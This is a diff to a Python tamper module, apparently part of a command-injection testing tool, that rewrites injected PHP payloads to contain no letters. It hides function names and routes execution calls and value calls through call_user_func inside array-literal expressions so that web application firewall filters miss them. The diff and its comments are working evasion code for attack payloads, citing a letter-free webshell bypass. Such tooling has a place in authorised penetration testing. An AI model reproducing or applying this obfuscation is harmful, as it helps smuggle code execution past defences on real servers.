@@ -24,15 +24,16 @@ References: [1] https://securityonline.info/bypass-waf-php-webshell-without-numb
 """
 
 """
-Two different calls are hidden two different ways below. An execution function is run only for what
-it does - its own return value is never read - so hiding it behind '&&' costs nothing: PHP short-
-circuits into the call, and what '&&' itself evaluates to is thrown away regardless. 'rtrim'/'strlen'/
-'ord'/'substr'/'intval' are read for what they answer, feeding a comparison or another call the same
-way the un-hidden call would have - and '&&' answers only true or false, never the value either side
-of it held. Hiding one of those behind '&&' silently replaces "did this string have length 6" with
-"did the call succeed", which reads the same on every length at once. An array literal is built and
-indexed instead: '[$_1=name,$_1(args)][1]' still hides the name (and, as an expression, sits wherever
-a value can) but the second element is the call's own answer, not '&&'s.
+Every call is hidden the same way: an array literal is built and indexed, '[$_1=name,$_1(args)][1]'.
+The literal hides the name, reads as an expression so it sits wherever a value can, and answers with
+the call's own return value at its second element.
+
+An execution function is run only for what it does, so what the construct answers with would not
+matter for those. It matters for 'rtrim'/'strlen'/'ord'/'substr'/'intval', which are read for what
+they answer and feed a comparison or another call: a sequencing operator that answers only true or
+false would silently replace "did this string have length 6" with "did the call succeed", which
+reads the same on every length at once. One shape for both leaves no second answer to get wrong,
+and leaves no operator in the payload beyond the separator it is proving.
 """
 
 __tamper__ = "phpnoletters"
@@ -62,10 +63,16 @@ def _hide_letters(text):
 
 """
 Calling a function by a name built the same way, so naming the function this reaches costs no
-letter either - assignment reads as an expression here, so this sits anywhere a value can.
+letter either. The assignment and the call are sequenced by an array literal, read back at its
+second element - which reads as an expression, so this sits anywhere a value can, and carries no
+'&&' of its own. A payload proves one separator; '&&' in a sink that chains on something else is
+one more character for a filter to strip, and a filter strips characters, it does not read PHP.
 """
 _CALL_USER_FUNC = "\"" + _hide_letters("call_user_func") + "\""
-_CALL_PREFIX = "($_1=" + _CALL_USER_FUNC + ")&&$_1("
+
+def _hidden_call(name, args):
+  return ("[$_1=" + _CALL_USER_FUNC + ",$_1(\"" + _hide_letters(name) + "\"" +
+          ("," if args else "") + args + ")][1]")
 
 # The probe and the execution functions - run for what they do, never read for what they answer.
 _EXEC_NAMES = list(settings.EXECUTION_FUNCTIONS_LVL3) + ["phpinfo", "sleep"]
@@ -76,13 +83,12 @@ _VALUE_NAMES = ["rtrim", "strlen", "ord", "substr", "intval"]
 
 # Each name's own pattern, compiled once rather than once per payload - none of the five changes
 # for the life of the process.
-_VALUE_CALL_PATTERNS = {name: re.compile(r"(?<![\w\\])" + re.escape(name) + r"\(") for name in _VALUE_NAMES}
+_CALL_PATTERNS = {}
 
-# Run one of the execution names through the letter-free call, its own arguments and closing
-# bracket left exactly where they were - no comma before them where the call took none of its own,
-# since this PHP still parses a trailing comma in a call as an error rather than an empty argument.
-def _hide_call(name, has_args):
-  return _CALL_PREFIX + "\"" + _hide_letters(name) + "\"" + ("," if has_args else "")
+def _call_pattern(name):
+  if name not in _CALL_PATTERNS:
+    _CALL_PATTERNS[name] = re.compile(r"(?<![\w\\])" + re.escape(name) + r"\(")
+  return _CALL_PATTERNS[name]
 
 """
 The closing bracket that balances the one at 'open_index', a backtick-run command's own '(' and ')'
@@ -111,7 +117,7 @@ just where it opens - has to be found and replaced in one piece, since the array
 around the end of it as much as the name is hidden at the start.
 """
 def _hide_value_calls(payload, name):
-  pattern = _VALUE_CALL_PATTERNS[name]
+  pattern = _call_pattern(name)
   pieces, pos = [], 0
   while True:
     match = pattern.search(payload, pos)
@@ -125,8 +131,7 @@ def _hide_value_calls(payload, name):
       break
     pieces.append(payload[pos:match.start()])
     args = payload[open_paren + 1:close_paren]
-    pieces.append("[$_1=" + _CALL_USER_FUNC + ",$_1(\"" + _hide_letters(name) + "\"" +
-                  ("," if args else "") + args + ")][1]")
+    pieces.append(_hidden_call(name, args))
     pos = close_paren + 1
   return "".join(pieces)
 
@@ -143,7 +148,7 @@ def _hide_print(payload):
   if close_paren == -1:
     return payload
   inner = payload[open_paren + 1:close_paren]
-  replacement = _CALL_PREFIX + "\"" + _hide_letters("printf") + "\",\"" + _hide_letters("%s") + "\"," + inner + ");"
+  replacement = _hidden_call("printf", "\"" + _hide_letters("%s") + "\"," + inner) + ";"
   return payload[:start] + replacement + payload[close_paren + 1:]
 
 """
@@ -162,14 +167,8 @@ def _hide_backtick(match):
   return "`" + _hide_letters(match.group(1)) + "`"
 
 def tamper(payload):
-  for name in _EXEC_NAMES:
-    # Only where the name opens a call of its own, so a longer name carrying a shorter one is not
-    # rewritten from the middle - and the call's own closing bracket still closes the new one.
-    pattern = r"(?<![\w\\])" + re.escape(name) + r"\("
-    payload = re.sub(pattern,
-                      lambda match, name=name: _hide_call(name, match.string[match.end():match.end() + 1] != ")"),
-                      payload)
-  for name in _VALUE_NAMES:
+  # Run for what they do or read for what they answer, every one is hidden the same way.
+  for name in _EXEC_NAMES + _VALUE_NAMES:
     payload = _hide_value_calls(payload, name)
   payload = payload.replace("exit()", _HALT_REPLACEMENT)
   payload = _hide_print(payload)
